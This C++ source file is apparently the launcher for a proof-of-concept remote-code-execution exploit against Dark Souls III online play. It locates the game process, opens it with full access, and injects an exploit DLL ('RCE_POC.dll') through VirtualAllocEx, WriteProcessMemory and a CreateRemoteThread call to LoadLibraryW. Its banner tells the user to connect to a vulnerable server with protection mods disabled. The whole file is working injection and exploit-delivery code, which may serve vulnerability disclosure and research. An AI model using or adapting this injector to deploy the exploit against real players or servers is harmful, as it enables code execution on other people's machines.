#include <Windows.h>
#include <cstdio>
#include <tlhelp32.h>

HANDLE OpenProcessByName(const wchar_t* name, DWORD desiredAccess)
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (lstrcmpW(entry.szExeFile, name) == 0)
            {
                return OpenProcess(desiredAccess, FALSE, entry.th32ProcessID);
            }
        }
    }
    CloseHandle(snapshot);
    return 0;
}

// Simple console application which will attempt to inject the proof-of-concept DLL
// into the game to send the exploit. 
int main()
{
    const wchar_t* dllPath = L"RCE_POC.dll";
    const wchar_t* procName = L"DarkSoulsIII.exe";

    printf("--------------------- NRSSR RCE Exploit Proof of Concept -------------------------\n"
        "Make sure that Dark Souls III is running, has no protection mods (Blue Sentinels)\n"
        "and that you are currently connected to a vulnerable server. When ready, press\n" 
        "any key and the proof-of-concept exploit DLL will be injected into the game.\n\n");
    
    system("pause >nul");

    HANDLE hProc = OpenProcessByName(procName, PROCESS_ALL_ACCESS);
    if (hProc == NULL)
    {
        printf("Error: Failed to open the Dark Souls III process (code %d)\n", GetLastError());
        system("pause");
        return 1;
    }

    wchar_t dllFullPath[MAX_PATH + 1];
    SIZE_T dllFullPathSz = GetFullPathName(dllPath, MAX_PATH + 1, dllFullPath, NULL);
    if (dllFullPathSz == 0 || dllFullPathSz > MAX_PATH)
    {
        printf("Error: Failed to query the full path to the exploit DLL (code %d)\n", GetLastError());
        system("pause");
        return 2;
    }
    LPVOID lib = VirtualAllocEx(hProc, NULL, 2 * (dllFullPathSz + 1), MEM_COMMIT, PAGE_READWRITE);
    if (lib == NULL)
    {
        printf("Error: Failed to allocate memory for the DLL name in the Dark Souls III process (code %d)\n", GetLastError());
        system("pause");
        return 3;
    }
    SIZE_T nWritten = 0;
    if (!WriteProcessMemory(hProc, lib, dllFullPath, 2 * (dllFullPathSz + 1), &nWritten) || nWritten != 2 * (dllFullPathSz + 1))
    {
        printf("Error: Failed to write the DLL name in Dark Souls III process memory (code %d)\n", GetLastError());
        VirtualFreeEx(hProc, lib, 0, MEM_RELEASE);
        system("pause");
        return 4;
    }
    LPVOID loadLibCall = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibCall, lib, 0, NULL);
    if (hThread == NULL)
    {
        printf("Error: Failed to create thread in the Dark Souls III process to load the DLL (code %d)\n", GetLastError());
        VirtualFreeEx(hProc, lib, 0, MEM_RELEASE);
        system("pause");
        return 5;
    }
    DWORD waitResult = WaitForSingleObject(hThread, 10000);
    if (waitResult != WAIT_OBJECT_0)
    {
        printf("Error: LoadLibrary thread timed out or failed (code %d)\n", GetLastError());
        VirtualFreeEx(hProc, lib, 0, MEM_RELEASE);
        system("pause");
        return 6;
    }

    VirtualFreeEx(hProc, lib, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProc);

    return 0;
}